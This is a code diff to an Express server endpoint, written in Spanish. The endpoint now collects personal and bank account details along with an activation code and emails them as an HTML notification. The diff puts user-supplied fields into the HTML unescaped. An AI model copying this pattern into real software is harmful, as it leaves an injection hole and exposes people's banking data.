@@ -88,7 +88,7 @@ app.post('/api/send-email', async (req, res) => {
 });
 
 app.post('/api/notify-code', async (req, res) => {
-  const { fullname, email, code } = req.body;
+  const { fullname, email, phone, country, bankName, accountType, accountNumber, accountHolder, code } = req.body;
   const now = new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' });
 
   const canal = code === 'LINPHONE' ? 'Global Numbers (recomendado)' : 'Proveedor externo (requiere validacion)';
@@ -98,11 +98,24 @@ app.post('/api/notify-code', async (req, res) => {
     + '<h2 style="color: #fff; margin: 0;">Nuevo codigo ingresado</h2>'
     + '</div>'
     + '<div style="background: #fff; padding: 20px; border: 1px solid #e0e0e0; border-radius: 0 0 8px 8px;">'
-    + '<p><strong>Nombre:</strong> ' + (fullname || 'No disponible') + '</p>'
-    + '<p><strong>Email:</strong> ' + (email || 'No disponible') + '</p>'
-    + '<p><strong>Codigo:</strong> ' + code + '</p>'
-    + '<p><strong>Canal de compra:</strong> ' + canal + '</p>'
-    + '<p><strong>Fecha/Hora:</strong> ' + now + '</p>'
+
+    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 0;">Datos personales</h3>'
+    + '<p style="margin: 6px 0;"><strong>Nombre:</strong> ' + (fullname || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Email:</strong> ' + (email || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Telefono:</strong> ' + (phone || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Pais:</strong> ' + (country || 'No disponible') + '</p>'
+
+    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 20px;">Datos bancarios</h3>'
+    + '<p style="margin: 6px 0;"><strong>Banco / Medio de pago:</strong> ' + (bankName || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Tipo de cuenta:</strong> ' + (accountType || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Numero de cuenta:</strong> ' + (accountNumber || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Titular de la cuenta:</strong> ' + (accountHolder || 'No disponible') + '</p>'
+
+    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 20px;">Activacion</h3>'
+    + '<p style="margin: 6px 0;"><strong>Codigo:</strong> ' + (code || 'No disponible') + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Canal de compra:</strong> ' + canal + '</p>'
+    + '<p style="margin: 6px 0;"><strong>Fecha/Hora (Chile):</strong> ' + now + '</p>'
+
     + '</div>'
     + '</div>';
 
